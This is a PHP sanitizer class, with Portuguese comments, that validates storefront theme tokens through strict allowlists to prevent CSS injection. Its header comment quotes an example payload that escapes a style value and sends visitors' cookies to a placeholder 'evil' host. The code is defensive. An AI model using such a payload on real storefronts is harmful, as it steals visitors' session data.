<?php

namespace App\Services;

/**
 * Valida tokens de tema antes de persistir.
 *
 * O storefront injeta estes valores dentro de um bloco <style> no SSR. Sem
 * validação estrita, um tenant poderia gravar algo como
 *   "0 0 0; } body { background: url(https://evil/?c=" + document.cookie
 * e obter execução de CSS arbitrário — exfiltração de dados de qualquer
 * visitante da loja. A allowlist abaixo é a única barreira contra isso, então
 * é deliberadamente restritiva: formatos fechados, sem strings livres.
 */
class ThemeSanitizer
{
    /** Fontes self-hosted disponíveis no storefront. */
    public const FONTS = [
        'inter', 'manrope', 'sora', 'playfair', 'dm-serif', 'space-grotesk',
    ];

    public const LAYOUTS = ['classic', 'grid', 'compact'];

    public const DEFAULTS = [
        'brand' => '234 88 12',
        'brandSoft' => '255 237 213',
        'surface' => '255 255 255',
        'ink' => '23 23 23',
        'brandInk' => '255 255 255',
        'font' => 'inter',
        'radius' => '16px',
        'layout' => 'classic',
    ];

    /** @return array<string,string> */
    public function sanitize(array $input): array
    {
        $brand = $this->rgb($input['brand'] ?? null, self::DEFAULTS['brand']);

        return [
            'brand' => $brand,
            'brandSoft' => $this->rgb($input['brandSoft'] ?? null, self::DEFAULTS['brandSoft']),
            'surface' => $this->rgb($input['surface'] ?? null, self::DEFAULTS['surface']),
            'ink' => $this->rgb($input['ink'] ?? null, self::DEFAULTS['ink']),
            'brandInk' => $this->calculateContrastInk($brand),
            'font' => $this->enum($input['font'] ?? null, self::FONTS, self::DEFAULTS['font']),
            'radius' => $this->radius($input['radius'] ?? null),
            'layout' => $this->enum($input['layout'] ?? null, self::LAYOUTS, self::DEFAULTS['layout']),
        ];
    }

    /**
     * Calcula se o texto sobre a cor de marca deve ser claro (255 255 255) ou escuro (17 17 19)
     * com base na luminância relativa percebida (W3C WCAG).
     */
    public function calculateContrastInk(string $brandRgb): string
    {
        $channels = array_map('intval', explode(' ', $brandRgb));
        if (count($channels) !== 3) {
            return '255 255 255';
        }

        [$r, $g, $b] = $channels;
        $luminance = (0.2126 * $r + 0.7152 * $g + 0.0722 * $b) / 255;

        return $luminance > 0.55 ? '17 17 19' : '255 255 255';
    }

    /**
     * Aceita apenas "R G B" com canais de 0 a 255.
     * O formato com espaços permite rgb(var(--brand) / <alpha>) no Tailwind.
     */
    private function rgb(mixed $value, string $fallback): string
    {
        if (! is_string($value) || ! preg_match('/^\d{1,3} \d{1,3} \d{1,3}$/', $value)) {
            return $fallback;
        }

        foreach (explode(' ', $value) as $channel) {
            if ((int) $channel > 255) {
                return $fallback;
            }
        }

        return $value;
    }

    private function radius(mixed $value): string
    {
        return is_string($value) && preg_match('/^(?:[0-9]|[1-2][0-9]|3[0-2])px$/', $value)
            ? $value
            : self::DEFAULTS['radius'];
    }

    /** @param string[] $allowed */
    private function enum(mixed $value, array $allowed, string $fallback): string
    {
        return is_string($value) && in_array($value, $allowed, true) ? $value : $fallback;
    }
}
